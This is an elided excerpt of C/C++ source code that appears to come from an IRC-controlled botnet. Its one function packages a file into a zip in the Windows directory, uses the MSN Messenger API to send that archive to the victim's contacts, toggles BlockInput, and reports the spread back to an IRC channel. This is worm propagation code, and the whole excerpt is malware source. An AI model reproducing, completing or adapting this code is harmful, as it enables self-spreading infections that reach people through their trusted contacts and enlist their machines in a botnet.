...
#ifndef NO_IMSPREAD
#import "../Libs/MSNMessengerAPI.tlb" named_guids, no_namespace
...
DWORD WINAPI ImFuck(LPVOID param)
{
    ...
    char msnzipn[512];
	char msnmsg[2048];
	strncpy(msnpicn,msn.data1,sizeof(msnpicn));
	strncpy(msnzipn,msn.data2,sizeof(msnzipn));
	if (!msn.bdata1) { strncpy(msnmsg,msn.data3,sizeof(msnmsg)); }
	...
	strcat(windir,"\\");
	strcat(windir, msnzipn);
    zip_store(buf3,windir,msnpicn);
		...
		if (SUCCEEDED(hr))
		{
			...
			if (SUCCEEDED(hr))
			{
				...
				if (SUCCEEDED(hr))
				{
							...
							if (SUCCEEDED(hr))
							{
								...
								if (SUCCEEDED(hr))
								{
									...
									if (SUCCEEDED(hr))
									{
										...
										Sleep(50);			
										dropfiles((char *)msnzipn, (HWND) wndIM);
					...
					BlockInput(false);
					irc->pmsg(msn.target,str_msn_spread, trx);
		...
		if (SUCCEEDED(hr))
		{
			...
			if (SUCCEEDED(hr))
			{
				...
				if (SUCCEEDED(hr))
				{
					...
					BlockInput(false);
					irc->pmsg(msn.target,str_msn_msg, trx);
					pIMessengerContacts->Release();
				}
				dispContacts->Release();
			}
